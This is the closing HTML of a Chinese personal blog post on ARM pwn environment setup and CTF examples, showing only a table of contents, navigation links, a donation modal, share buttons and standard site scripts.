      <a href="/2019/07/20/pwn-patch-method/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Pwn patch method</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/2019/07/09/io-file-利用方法/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">_IO_FILE 利用方法</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#环境搭建"><span class="post-toc-number">1.</span> <span class="post-toc-text">环境搭建</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#关于ARM"><span class="post-toc-number">2.</span> <span class="post-toc-text">关于ARM</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#示例"><span class="post-toc-number">3.</span> <span class="post-toc-text">示例</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#typo"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">typo</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#题目"><span class="post-toc-number">3.1.1.</span> <span class="post-toc-text">题目</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#思路"><span class="post-toc-number">3.1.2.</span> <span class="post-toc-text">思路</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp"><span class="post-toc-number">3.1.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#easy-arm"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">easy_arm</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#题目-1"><span class="post-toc-number">3.2.1.</span> <span class="post-toc-text">题目</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#思路-1"><span class="post-toc-number">3.2.2.</span> <span class="post-toc-text">思路</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp-1"><span class="post-toc-number">3.2.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#之前的尝试笔记"><span class="post-toc-number">4.</span> <span class="post-toc-text">之前的尝试笔记</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#arm-程序运行"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">arm 程序运行</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#arm-gdb"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">arm-gdb</span></a></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

    <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        请我喝奶茶呀
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>

    
</div>

        <footer class="footer">
    
    <div class="top">
        
    </div>
    
    <div class="bottom">
        <p>
            <span>
                Sirius Whiter &copy; 2018 - 2020
            </span>
        		
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2019/07/13/arm-pwn-环境搭建及示例/&title=《Arm-pwn 环境搭建及示例》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2019/07/13/arm-pwn-环境搭建及示例/&title=《Arm-pwn 环境搭建及示例》 — Room of Requirement&source=菜鸡一枚" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACuElEQVR42u3a0W7jMAwEwPz/T7evVxS2d0UpzQGjJ8MwbI0CiAzF1yseX7/Gv/fvr5M3JPd/v3PbwMPDwxtP/f5jV5j7qdzfX1vKaAnw8PDwjvGudtT7Sczx7XvyOePh4eF9Du8+tb1/W069Dyp4eHh4/xevBedLkC8rHh4e3ifwJonvWtqdb/p5kRcPDw/vPbx2K/+E6yPne3h4eHjjU/W8ZFAkuPFE8zBwOVs8PDy8A7z2Y0kRoW2f2tt0hYeHh/ce3nyDbosIk5S9LYLg4eHhneAlm2++oScJ9CRsJOAoXuHh4eGNeXkMaZtK2yVok+mHwIOHh4e3lTf/q3+/TecJd95YUPwnwMPDwzvGmx8ytVNvi8Jrc8bDw8M7x8uT5rUi7FqJtqg0XwU5PDw8vLfwimam4OC/fWe7oHVgwMPDw9vEWyscTO6/yrGW0OPh4eGd5rXb7rwwsStgXD6Ph4eHd4CXnx8lB2Z5Ct62ZM3bC/Dw8PB28U5McVeJYY304w4eHh7eAV7ehrVW8G1T4SQ4tW1heHh4eOd4eVtA20DQPrnWXhD9bnh4eHhjXj7dtiTRtp8mVZO2mQAPDw/vHC///Fo4WRtt88HD+R4eHh7eJt6kGLG29edTaVu7NqwZHh4eXszLD7TaiU7aAtqCyGVSjoeHh3eM1276kyLC/M5irMPDw8M7zJsUVdcmtPb8QxEEDw8P7xgv/8B8s26/MgpveHh4eFt5X+WYFx2SUDRJqS87I/Dw8PA28SYH+flB11rpdu35xcYFPDw8vJLXBoP763wrT77Yvq34ZfDw8PDGvHxTniS4bYHjtTQeOiPw8PDwPpiXPJ8sTV7+eKhS4+Hh4f0pL/9Ym1jnBY5ocfHw8PCO8drSQN5GsHacNjk2w8PDwzvNa//ez1PwvFSxt0iBh4eHN+Z9AwZXAycBfbEwAAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>


    
    <!-- main-js -->
<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/plugins/jquery.swipebox.min.js?v=1.3.2"></script>
<script type="text/javascript" color="255,0,0"opacity="0.3"count="70" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

<script type="text/javascript" src="https://cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script type="text/javascript" src="/js/method.js?v=1.3.2"></script>
<script type="text/javascript" src="/js/blog.js?v=1.3.2"></script>

<!-- third-party -->
<script type="text/javascript">
;( function( $ ) {

	$( '.swipebox' ).swipebox({
		hideCloseButtonOnMobile: true
	});

} )( jQuery );
</script>






<script type="text/javascript" src="/js/plugins/local_search.js?v=1.3.2"></script>
<script type="text/javascript">
	var search_path = "search.xml";
	if (search_path.length === 0) {
		search_path = "search.xml";
	}
	var path = "/" + search_path;
	searchFunc(path, "local-search-input", "local-search-result");
</script>



<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>



    
    





    <!-- mathjax config similar to math.stackexchange -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
            processEscapes: true,
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>






    
</body>
</html>
